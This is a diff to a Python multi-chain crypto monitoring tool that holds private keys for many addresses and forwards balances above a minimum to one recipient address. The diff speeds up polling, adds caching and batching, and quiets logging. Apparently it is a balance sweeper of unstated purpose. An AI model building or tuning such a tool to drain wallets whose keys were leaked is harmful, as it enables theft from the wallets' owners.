@@ -613,7 +613,7 @@ class AlchemyAPI:
         
         # API限频控制
         self.last_request_time = 0
-        self.min_request_interval = 0.05  # 50ms间隔，提升速度
+        self.min_request_interval = 0.1  # 100ms间隔，按用户要求
     
     async def _rate_limit(self):
         """API限频控制"""
@@ -662,12 +662,12 @@ class AlchemyAPI:
             status_code = getattr(http_error.response, 'status_code', None)
             # 对于 400/403/404，视为该链在 Alchemy 上不受支持或密钥未开通，返回 False 以触发屏蔽
             if status_code in (400, 403, 404):
-                logging.warning(
+                logging.debug(
                     f"{chain_config['name']} 在 Alchemy 上不可用或未开通 (HTTP {status_code})，将屏蔽该链"
                 )
                 return False
             # 其它HTTP错误，保守处理为暂不屏蔽
-            logging.warning(f"检查交易历史失败 {chain_config['name']} (HTTP {status_code}): {http_error}")
+            logging.debug(f"检查交易历史失败 {chain_config['name']} (HTTP {status_code}): {http_error}")
             return True
         except Exception as e:
             # 网络超时等暂时性错误，不屏蔽
@@ -1150,6 +1150,7 @@ class MonitoringApp:
         self.addresses = []
         self.config = {}
         self.monitoring_active = False
+        self.blocked_chains_cache = set()  # 缓存已屏蔽的链，避免重复数据库查询
         self.setup_logging()
     
     def setup_logging(self):
@@ -1261,8 +1262,8 @@ class MonitoringApp:
                 ],
                 "erc20": [],
                 "settings": {
-                    "monitoring_interval": 0.1,
-                    "round_pause": 10,
+                    "monitoring_interval": 0.01,
+                    "round_pause": 5,
                     "gas_threshold_gwei": 50,
                     "gas_wait_time": 60
                 }
@@ -1288,7 +1289,7 @@ class MonitoringApp:
             await self.db_manager.block_chain(
                 address, chain_config['name'], chain_config['chain_id']
             )
-            logging.info(f"屏蔽链 {chain_config['name']} (地址: {address}): 无交易历史")
+            logging.debug(f"屏蔽链 {chain_config['name']} (地址: {address}): 无交易历史或不可用")
         
         return has_history
     
@@ -1298,10 +1299,19 @@ class MonitoringApp:
         private_key = address_info['private_key']
         
         try:
+            # 使用缓存快速检查链是否已被屏蔽
+            cache_key = f"{address}:{chain_config['chain_id']}"
+            if cache_key in self.blocked_chains_cache:
+                return
+            
+            # 检查数据库中是否已屏蔽
+            if await self.db_manager.is_chain_blocked(address, chain_config['chain_id']):
+                self.blocked_chains_cache.add(cache_key)
+                return
+            
             # 检查链是否被屏蔽或不受支持
             if not await self.check_chain_history(address, chain_config):
-                # 立即屏蔽以避免重复请求
-                await self.db_manager.block_chain(address, chain_config['name'], chain_config['chain_id'])
+                self.blocked_chains_cache.add(cache_key)
                 return
             
             # 获取所有代币余额（原生代币+ERC-20）
@@ -1465,20 +1475,33 @@ class MonitoringApp:
                             task = self.monitor_address_chain(address_info, chain_config)
                             tasks.append(task)
                 
-                # 并发执行所有监控任务
+                # 分批执行监控任务以提高速度
                 if tasks:
-                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    batch_size = 50  # 每批50个任务
+                    total_success = 0
+                    total_errors = 0
                     
-                    # 统计结果
-                    success_count = 0
-                    error_count = 0
-                    for result in results:
-                        if isinstance(result, Exception):
-                            error_count += 1
-                        else:
-                            success_count += 1
+                    for i in range(0, len(tasks), batch_size):
+                        batch_tasks = tasks[i:i + batch_size]
+                        results = await asyncio.gather(*batch_tasks, return_exceptions=True)
+                        
+                        # 统计结果
+                        batch_success = 0
+                        batch_errors = 0
+                        for result in results:
+                            if isinstance(result, Exception):
+                                batch_errors += 1
+                            else:
+                                batch_success += 1
+                        
+                        total_success += batch_success
+                        total_errors += batch_errors
+                        
+                        # 批次间短暂暂停
+                        if i + batch_size < len(tasks):
+                            await asyncio.sleep(0.1)
                     
-                    print(f"✅ 第 {round_count} 轮监控完成: {success_count} 成功, {error_count} 错误")
+                    print(f"✅ 第 {round_count} 轮监控完成: {total_success} 成功, {total_errors} 错误")
                 
                 # 轮询间隔
                 monitoring_interval = self.config.get('settings', {}).get('monitoring_interval', 0.1)
@@ -1622,22 +1645,34 @@ class MonitoringApp:
                         except Exception as e:
                             logging.error(f"处理私钥失败: {e}")
 
-                    # 创建完整的配置 - 包含所有支持的链
+                    # 创建配置 - 只包含确认可用的主要链
+                    working_chains = [
+                        "ETH_MAINNET", "POLYGON_MAINNET", "ARBITRUM_ONE", 
+                        "OPTIMISM_MAINNET", "BASE_MAINNET", "ARBITRUM_NOVA",
+                        "ZKSYNC_ERA", "AVALANCHE_C", "BSC_MAINNET", 
+                        "BLAST", "LINEA", "ZORA", "ASTAR", "ZETACHAIN",
+                        "MANTLE", "GNOSIS", "CELO", "SCROLL", "WORLD_CHAIN",
+                        "SHAPE", "BERACHAIN", "UNICHAIN", "DEGEN", "APECHAIN",
+                        "ANIME", "SONIC", "SEI", "OPBNB", "ABSTRACT", "SONEIUM"
+                    ]
+                    
                     chains_config = []
-                    for chain_name, chain_info in ChainConfig.SUPPORTED_CHAINS.items():
-                        chains_config.append({
-                            "name": chain_name,
-                            "chain_id": chain_info['chain_id'],
-                            "recipient_address": recipient_address,
-                            "min_amount": "0.001"
-                        })
+                    for chain_name in working_chains:
+                        if chain_name in ChainConfig.SUPPORTED_CHAINS:
+                            chain_info = ChainConfig.SUPPORTED_CHAINS[chain_name]
+                            chains_config.append({
+                                "name": chain_name,
+                                "chain_id": chain_info['chain_id'],
+                                "recipient_address": recipient_address,
+                                "min_amount": "0.001"
+                            })
 
                     self.config = {
                         "chains": chains_config,
                         "erc20": [],
                         "settings": {
-                            "monitoring_interval": 0.1,
-                            "round_pause": 10,
+                            "monitoring_interval": 0.01,
+                            "round_pause": 5,
                             "gas_threshold_gwei": 50,
                             "gas_wait_time": 60
                         }
